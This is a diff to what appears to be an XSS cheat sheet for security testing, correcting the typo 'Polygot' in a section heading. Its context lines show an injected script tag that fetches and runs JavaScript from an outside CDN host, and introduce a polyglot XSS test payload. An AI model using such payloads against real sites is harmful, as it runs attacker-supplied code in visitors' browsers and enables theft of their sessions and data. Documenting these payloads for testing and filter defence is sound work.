@@ -14,7 +14,7 @@ This is a normal XSS JavaScript injection, and most likely to get caught but I s
 
 `<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>`
 
-### XSS Locator (Polygot)
+### XSS Locator (Polyglot)
 
 The following is a "polyglot test XSS payload." This test will execute in multiple contexts including html, script string, js and URL. (Based on this [tweet](https://twitter.com/garethheyes/status/997466212190781445) by [Gareth Heyes](https://twitter.com/garethheyes)).
 
